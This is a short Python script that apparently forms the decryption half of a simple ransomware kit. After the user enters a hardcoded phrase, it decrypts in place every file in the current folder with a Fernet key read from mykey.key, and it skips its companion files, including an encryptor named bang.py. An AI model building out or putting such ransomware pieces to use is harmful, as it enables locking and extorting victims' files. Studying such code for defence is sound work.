#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    
    if file == "bang.py" or file =="mykey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("mykey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "decryptmyfiles"

user_phrase = input("Enter the phrase to decrypt your files: ")

if user_phrase == secretphrase:

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

    print("Your files are decrypted.")
